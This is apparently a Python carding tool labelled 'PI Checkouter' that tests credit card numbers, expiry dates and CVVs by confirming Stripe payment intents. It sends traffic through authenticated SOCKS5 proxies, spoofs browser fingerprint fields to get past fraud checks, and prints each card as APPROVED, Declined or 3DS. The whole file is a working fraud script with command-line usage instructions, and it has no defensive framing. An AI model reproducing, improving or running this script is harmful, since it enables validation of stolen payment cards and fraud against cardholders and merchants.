#!/usr/bin/env python3
import sys
import requests
import json
import time
import os

def pistuff(cc, mes, ano, cvv, pk, secretpi, proxy_ip_port, credentials):
    try:
        # Setup session with proxy
        r = requests.Session()
        proxy_parts = proxy_ip_port.split(':')
        proxy_ip = proxy_parts[0]
        proxy_port = proxy_parts[1]
        
        cred_parts = credentials.split(':')
        username = cred_parts[0]
        password = cred_parts[1]
        
        proxies = {
            "http": f"socks5://{username}:{password}@{proxy_ip}:{proxy_port}",
            "https": f"socks5://{username}:{password}@{proxy_ip}:{proxy_port}"
        }
        
        # Common headers
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }

        # Get Stripe tokens (muid, guid, sid)
        try:
            response = r.post("https://m.stripe.com/6", headers=headers, proxies=proxies, timeout=10)
            json_data = response.json()
            m = json_data.get("muid", "")
            s = json_data.get("sid", "")
            g = json_data.get("guid", "")
        except Exception as e:
            print(f"Error getting Stripe tokens: {str(e)}")
            m = ""
            s = ""
            g = ""

        # Extract payment intent ID from secretpi
        index = secretpi.find('_secret_')
        if index != -1:
            pi = secretpi[:index]
        else:
            print("Secret key not found in response.")
            return f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» INVALID_PI_SECRET"
        
        # Prepare data for payment intent confirmation
        data = {
            'payment_method_data[type]': 'card',
            'payment_method_data[billing_details][name]': 'John Doe',
            'payment_method_data[card][number]': cc,
            'payment_method_data[card][exp_month]': mes,
            'payment_method_data[card][exp_year]': ano,
            'payment_method_data[card][cvc]': cvv,
            'payment_method_data[guid]': g,
            'payment_method_data[muid]': m,
            'payment_method_data[sid]': s,
            'payment_method_data[pasted_fields]': 'number',
            'payment_method_data[payment_user_agent]': 'stripe.js/b8ea90bb0; stripe-js-v3/b8ea90bb0',
            'payment_method_data[time_on_page]': '60000',
            'expected_payment_method_type': 'card',
            'use_stripe_sdk': 'true',
            'key': pk,
            'client_secret': secretpi
        }
        
        # Confirm payment intent
        confirm_url = f'https://api.stripe.com/v1/payment_intents/{pi}/confirm'
        response = r.post(confirm_url, headers=headers, data=data, proxies=proxies, timeout=15)
        
        # Process response
        try:
            response_json = response.json()
            code = response_json.get("error", {}).get("code", "")
            decline_code = response_json.get("error", {}).get("decline_code", "")
            message = response_json.get("error", {}).get("message", "")
            
            # Check for successful payment
            if response.status_code == 200 and response_json.get("status") == "succeeded":
                return f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Payment successful\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» APPROVED"
            
            # Check for 3DS requirement
            elif "requires_source_action" in response.text or "intent_confirmation_challenge" in response.text or "requires_action" in response.text:
                return f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» 3DS CARD"
            
            # Handle decline
            else:
                return f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» {code} | {decline_code} | {message}"
                
        except Exception as e:
            return f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Error processing response\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» {str(e)}"
            
    except Exception as e:
        return f"\n✫PI Checkouter✫\n➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Connection error\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» {str(e)}"

# Main execution
if __name__ == "__main__":
    # Check if correct arguments are provided
    if len(sys.argv) < 9:
        print("Usage: python3 stripe_verify.py [cc] [mes] [ano] [cvv] [pk] [secretpi] [proxy] [credentials]")
        sys.exit(1)
    
    # Get arguments
    cc = sys.argv[1]
    mes = sys.argv[2]
    ano = sys.argv[3]
    cvv = sys.argv[4]
    pk = sys.argv[5]
    secretpi = sys.argv[6]
    proxy = sys.argv[7]
    credentials = sys.argv[8]
    
    # Run verification
    result = pistuff(cc, mes, ano, cvv, pk, secretpi, proxy, credentials)
    print(result)
